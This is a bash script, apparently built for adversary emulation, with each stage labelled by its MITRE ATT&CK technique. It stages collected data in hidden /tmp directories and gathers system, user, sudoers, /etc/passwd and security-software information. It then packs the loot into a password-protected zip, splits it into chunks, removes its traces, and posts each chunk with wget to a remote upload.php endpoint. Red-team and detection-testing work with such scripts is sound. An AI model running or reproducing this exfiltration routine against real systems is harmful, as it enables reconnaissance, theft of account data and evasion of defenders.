#!/bin/bash


# Technique: Hide Artifacts: Hidden Files and Directories https://attack.mitre.org/techniques/T1564/001/
# Create a hidden directory to store our collected data in
if [ ! -d "/tmp/.staging/" ]; then mkdir -p /tmp/.staging/; fi;
if [ ! -d "/tmp/.exfil/" ]; then mkdir -p /tmp/.exfil/; fi;


############################################
# Tactic: Discovery
# Technique: System Information Discovery https://attack.mitre.org/wiki/Technique/T1082
############################################
function discovery() {
  SYSINF="/tmp/.staging/system.txt"
  echo -e "Target Platform: $OSTYPE "
  echo "Target Platform: " $OSTYPE >> $SYSINF
  echo "Target Kernel:" >> $SYSINF && uname -a >> $SYSINF
  echo "Uptime:" >> $SYSINF && uptime >> $SYSINF
  echo "hostname:" >> $SYSINF && hostname >> $SYSINF
  echo -e "Getting General Release Information \n"
  echo -e "Getting Linux Release Information \n"
  echo "Release:" >> $SYSINF
  lsb_release >> $SYSINF 2> /dev/null


  ### Technique: Account Discovery https://attack.mitre.org/wiki/Technique/T1087
  ### Collect User Account Information
  USERINF=/tmp/.staging/users.txt
  echo -e "Getting User Information "
  echo "Whoami:" >> $USERINF && whoami >> $USERINF
  echo "Current User Activity:" >> $USERINF && w >> $USERINF 2> /dev/null
  echo "Sudo Privs" >> $USERINF && sudo -l -n >> $USERINF 2> /dev/null
  echo "Sudoers" >> $USERINF && cat /etc/sudoers >> $USERINF 2> /dev/null
  echo "Last:" >> $USERINF && last >> $USERINF 2> /dev/null

  echo -e "Getting Linux Group Information "
  echo "Group Information:" >> $USERINF
  cat /etc/passwd >> $USERINF
  echo "Elevated Users" >> $USERINF && grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> $USERINF


  ### Technique: Software Discovery: Security Software Discovery https://attack.mitre.org/techniques/T1518/001/
  ### Check for common security Software
  SECINF=/tmp/.staging/security.txt
  echo -e "Getting Security Software Information "
  echo "Running Security Processes" >> $SECINF && ps ax | grep -v grep | grep -e Carbon -e Snitch -e OpenDNS -e RTProtectionDaemon -e CSDaemon -e cma >> $SECINF
}


############################################
# Tacttic: Exfiltration
# Technique:  Archive Collected Data: Archive via Library https://attack.mitre.org/techniques/T1560/002/
############################################
function stage_exfil() {
echo -e "Compress and encrypt all collected data for exfil "
Z1="zip --password 'Hope' /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1"
if [ ! -x "$(command -v zip)" ]; then apt install zip -y > /dev/null 2>&1; $Z1; else $Z1; fi;


echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil "
split -a 15 -b 55 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"

}




############################################
# Tactic: Defense Evasion
# Technique: Delete File Indicator Removal on Host: File Deletion https://attack.mitre.org/techniques/T1070/004/
############################################
function cleanup() {
  rm -rf /tmp/payback
  rm -rf /tmp/.staging/
}

#################################################
# Exfil and Cleanup - Indicator Removal on Host
#################################################
function exfil() {
  for f in $(ls /tmp/.exfil/loot.zip.*); do wget --post-file=$f https://192.168.11.110/upload.php -q; sleep 2m; done
  # Optionally, delete exfil directory to clean up
  rm -rf /tmp/.exfil/
}

discovery
stage_exfil
cleanup
exfil
